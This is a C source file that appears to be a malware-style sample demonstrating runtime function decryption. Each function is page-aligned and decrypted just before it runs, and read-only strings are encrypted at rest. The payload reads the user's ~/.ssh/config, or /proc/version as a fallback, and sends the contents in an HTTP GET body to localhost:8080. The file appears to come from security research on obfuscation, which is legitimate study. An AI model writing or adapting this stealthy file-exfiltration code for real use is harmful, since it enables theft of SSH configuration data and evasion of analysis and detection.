#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <netdb.h>
#include <string.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

#define BUF_SIZE 500
#define HOST "localhost"
#define PORT "8080"
#define REQUEST "GET /oplzkwp HTTP/1.0\r\n" \
		"Content-Length: %d\r\n\r\n" \
		"%s"

int sfd, config_length;
char config[4096];
extern void decrypt_and_call(void *);
extern void decrypt_rodata(void);

void _e_close_socket(void) __attribute__((aligned(PAGE_SIZE)));
void _e_send_request(void) __attribute__((aligned(PAGE_SIZE)));
void _e_read_config(void)  __attribute__((aligned(PAGE_SIZE)));
void _e_connect(void)	   __attribute__((aligned(PAGE_SIZE)));
void _e_main(void)	   __attribute__((aligned(PAGE_SIZE)));
int  main(void)		   __attribute__((aligned(PAGE_SIZE)));

/* Marker for encrypted strings. Any .rodata beyond will be 
 * encrypted at rest */
const char *encrypted_strings_marker = "_marker_" ;

void _e_close_socket(void){
	close(sfd);
}

void _e_send_request(void)
{
	char buf[BUF_SIZE];
	ssize_t n;
	char *request;
	int request_length;

	request_length = asprintf(&request, REQUEST, config_length, config);
	n = write(sfd, request, request_length);
	if (n != request_length) {
		fprintf(stderr, "partial/failed write\n");
		exit(EXIT_FAILURE);
	}
	n = read(sfd, buf, BUF_SIZE);
	if (n == -1) {
		perror("read");
		exit(EXIT_FAILURE);
	}
	printf("Received %zd bytes: %s\n", n, buf);
	return;
}

void _e_read_config(void)
{
	int f;
	char *path;

	asprintf(&path, "%s/.ssh/config", getenv("HOME"));
	f = open(path, O_RDONLY);
	free(path);
	if(f < 0) {
		f = open("/proc/version", O_RDONLY);
		if(f < 0) {
			fprintf(stderr, "unable to open file\n");
			exit(EXIT_FAILURE);
		}
	}
	config_length = read(f, config, sizeof(config) - 1);
	if(config_length < 0) {
		fprintf(stderr, "unable to read file\n");
		exit(EXIT_FAILURE);
	}
	close(f);
}

void _e_connect(void)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = 0;
	hints.ai_protocol = 0;

	s = getaddrinfo(HOST, PORT, &hints, &result);
	if (s != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
		exit(EXIT_FAILURE);
	}

	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket(rp->ai_family, rp->ai_socktype,
		rp->ai_protocol);
		if (sfd == -1)
			continue;

		if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
			break;

		close(sfd);
	}
	if (rp == NULL) {
		fprintf(stderr, "Could not connect\n");
		exit(EXIT_FAILURE);
	}

	freeaddrinfo(result);
	return;
}

void _e_main(void)
{
	// Include Aczid "helpers" here
	// www.hackintherandom2600nldatabox.nl/archive/slides/2012/aczid.pdf
	decrypt_and_call(_e_connect);
	decrypt_and_call(_e_read_config);
	decrypt_and_call(_e_send_request);
	decrypt_and_call(_e_close_socket);
}

int main(void)
{
	decrypt_rodata();
	decrypt_and_call(_e_main);
	return 0;
}
